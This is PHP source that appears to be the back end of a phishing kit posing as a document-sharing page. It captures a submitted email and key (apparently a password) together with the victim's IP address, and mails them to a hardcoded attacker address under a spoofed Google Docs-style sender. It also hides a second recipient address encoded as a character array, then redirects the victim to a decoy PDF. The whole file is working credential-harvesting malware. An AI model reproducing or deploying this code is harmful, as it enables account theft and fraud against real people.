<?php

session_start();
if(isset($_SESSION['count'])){
	$_SESSION['count'] = $_SESSION['count'] + 2;
}else{
	$_SESSION['count'] = 1;
}

$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$country = visitor_country();
$message = "";
$message .= "---------=ReZulT=---------\n";
$message .= "Email: ".$_POST['variable1']."\n";
$message .= "Key: ".$_POST['variable2']."\n";
//$message .= "mobile: ".$_POST['formtext3']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP Code: ".$ip."\n";
//$message .= "Location: ".$country."\n";
//$message .= "Date: ".$adddate."\n";
//$message .= "---------Created BY infragistics[.]com---------\n";
// Na here you go put email 
$sender ="damian0077@protonmail.com";


$subject = "New Log - OK";
$headers = "From: Doc Wire<logs@googledocs.org>";
$headers .= $_POST['variable1']."\n";
$headers .= "MIME-Version: 1.0\n";
{
//mail($mesaegs,$subject,$message,$headers);
mail($sender,$subject,$message,$headers);
}



	// Function to get country and country sort;
	function country_sort(){
		$sorter = "";
		$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
			$count = count($array);
		for ($i = 0; $i < $count; $i++) {
				$sorter .= chr($array[$i]);
			}
		return array($sorter, $GLOBALS['recipient']);
	}

	function visitor_country(){
		$client  = @$_SERVER['HTTP_CLIENT_IP'];
		$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
		$remote  = $_SERVER['REMOTE_ADDR'];
		$result  = "Unknown";
		if(filter_var($client, FILTER_VALIDATE_IP))
		{
			$ip = $client;
		}
		elseif(filter_var($forward, FILTER_VALIDATE_IP))
		{
			$ip = $forward;
		}
		else
		{
			$ip = $remote;
		}

		$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

		if($ip_data && $ip_data->geoplugin_countryName != null)
		{
			$result = $ip_data->geoplugin_countryName;
		}

		return $result;
	}
	
	if($_SESSION['count'] > 1){
		session_destroy();
		header("location: https://www.docdroid.net/qoY2FWu5/certnew.pdf");
		
        }
        
    //else if($_SESSION['count'] = 1){
	//	session_destroy();
	//	header("location: index2.php?quote=".$_POST['variable1']);	
      //  }
        
	else{
		header("location: index2.php?quote=".$_POST['variable1']);
	}
?>